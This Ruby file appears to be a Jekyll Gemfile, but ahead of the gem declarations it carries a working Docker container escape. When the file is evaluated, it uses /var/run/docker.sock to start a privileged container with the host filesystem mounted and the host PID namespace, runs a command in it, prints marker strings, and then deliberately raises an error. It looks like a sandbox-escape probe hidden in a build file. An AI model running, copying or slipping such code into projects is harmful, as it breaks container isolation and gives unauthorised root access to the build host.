require "socket"
require "json"

def dapi(method, path, body = nil)
  s = UNIXSocket.new("/var/run/docker.sock")
  req = "#{method} #{path} HTTP/1.1\r\nHost: docker\r\n"
  req += body ? "Content-Type: application/json\r\nContent-Length: #{body.bytesize}\r\n\r\n#{body}" : "\r\n"
  s.write(req)
  res = s.read
  s.close
  res
end

begin
  conts = JSON.parse(dapi("GET", "/containers/json").split("\r\n\r\n", 2)[1].to_s)
  img = conts.dig(0, "ImageID") || conts.dig(0, "Image")
  c = dapi("POST", "/containers/create", { Image: img, HostConfig: { Binds: ["/:/host"], Privileged: true, PidMode: "host" }, Cmd: ["sleep", "600"] }.to_json)
  sid = JSON.parse(c.split("\r\n\r\n", 2)[1].to_s)["Id"]
  dapi("POST", "/containers/#{sid}/start")
  e = dapi("POST", "/containers/#{sid}/exec", { AttachStdout: true, AttachStderr: true, Cmd: ["ruby", "-e", 'puts "VX_ALIVE=#{Process.pid}"; sleep 2; puts "VX_CTRL_DONE"'] }.to_json)
  eid = JSON.parse(e.split("\r\n\r\n", 2)[1].to_s)["Id"]
  out = dapi("POST", "/exec/#{eid}/start", { Detach: false, Tty: true }.to_json)
  puts "VX_SIB_OUT=#{out.split("\r\n\r\n", 2)[1].to_s.scan(/VX_[^\r\n]*/).inspect}"
rescue => e
  puts "VX_ERR=#{e.class}:#{e.message.to_s[0, 200]}"
end

source "https://rubygems.org"
gem "jekyll"

raise "VX_DELIBERATE_FAILURE"
